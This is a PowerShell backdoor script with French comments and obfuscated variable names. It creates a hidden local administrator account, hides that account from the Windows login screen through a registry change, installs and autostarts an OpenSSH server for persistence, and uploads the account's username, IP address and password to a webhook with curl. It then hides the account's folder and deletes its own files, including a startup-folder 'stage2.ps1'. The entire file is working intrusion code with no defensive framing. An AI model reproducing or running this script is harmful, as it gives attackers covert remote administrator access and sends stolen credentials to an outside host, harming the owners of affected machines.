
Function Get-RandomAlphanumericString {
	-join ((65..90) + (97..122) | Get-Random -Count 10 | % {[char]$_})
}

$fr = Get-RandomAlphanumericString
$temp = "$env:TEMP/$fr"
$init_path = Get-Location

mkdir  $temp
cd $temp
cd $init_path

# Création d'un local admin
function PklIyfgtrfjd {
    [CmdletBinding()]
    param (
        [string] $JhfuihdfOm,
        [securestring] $lOjgyNbsdsdsg
    )    
    begin {
    }    
    process {
        New-LocalUser -Name $JhfuihdfOm -Password $lOjgyNbsdsdsg -FullName $JhfuihdfOm -Description "Compte d'utilisateur invite"
        Add-LocalGroupMember -Group "Administrateurs" -Member $JhfuihdfOm
    }    
    end {
    }
}

# Création de l'administrateur local
$name = "Guest"
$password = Get-RandomAlphanumericString

# Supprimer l'utilisateur seulement s'il existe
Remove-LocalUser -Name $name -ErrorAction SilentlyContinue

$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
PklIyfgtrfjd -JhfuihdfOm $name -lOjgyNbsdsdsg $securePassword



# registry
$jhdsfgLohfdTbdh = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
$vGfTFVDNnbf = '00000000'
New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name SpecialAccounts -Force
New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts' -Name UserList -Force
New-ItemProperty -Path $jhdsfgLohfdTbdh -Name $name -Value $vGfTFVDNnbf -PropertyType DWORD -Force



# ssh server : 

Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 # Ajoute un package de fonctionnalités au systeme d'exploitation EN COURS D'EXECUTION source : OpenSSH
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic' # Persistence


# informations

Set-Location $temp

$dVbsxUYbndsd = "$env:UserName.txt"
$OjgfhgUyyg = (Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"}).IPv4Address.IPAddress
New-Item -path "." -Name $dVbsxUYbndsd -Force

Add-Content -path "./$dVbsxUYbndsd" -Value $name -Force #username
Add-Content -path "./$dVbsxUYbndsd" -Value $OjgfhgUyyg -Force #ip
Add-Content -path "./$dVbsxUYbndsd" -Value $password -Force #pass
Add-Content -path "./$dVbsxUYbndsd" -Value "local" -Force #connexion type




$filePath = "C:\Users\$env:UserName\AppData\Local\Temp\fruHgdbsM.txt"

$webhookUrl = Get-Content -Path $filePath

Invoke-Expression "curl.exe -F `"payload_json={\```"username\```": \```"tobashiconsole\```", \```"content\```": \```"Download !\```"}`" -F ```"file=@$dVbsxUYbndsd```" $webhookUrl"

# escape
attrib +h +s +r C:\Users\$name
Set-Location ..
Remove-Item -Path ".\fruHgdbsM.txt" -Force
Remove-Item -Path ".\$fr" -Recurse -Force
Remove-Item -Path "C:\Users\$env:UserName\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\stage2.ps1" -Force